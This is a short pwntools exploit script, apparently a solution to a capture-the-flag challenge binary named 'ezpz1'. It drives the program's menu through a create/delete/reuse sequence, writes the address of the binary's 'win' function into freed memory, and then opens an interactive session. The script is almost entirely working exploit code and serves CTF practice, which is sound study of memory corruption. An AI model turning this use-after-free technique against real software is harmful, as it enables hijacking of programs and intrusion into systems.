#!/usr/bin/env  python2 

from pwn import *


p = process('./ezpz1')
e = p.elf

p.recvuntil(': ', drop=True)
p.sendline('C')

p.recvuntil(': ', drop=True)
p.sendline('D')
p.recvuntil(': ', drop=True)
p.sendline('0')

p.recvuntil(': ', drop=True)
p.sendline('C')

p.recvuntil(': ', drop=True)
p.sendline('S')
p.sendline('0')
p.sendline(p32(e.symbols['win']))

p.recvuntil(': ', drop=True)
p.sendline('A')
p.sendline('1')

p.interactive()
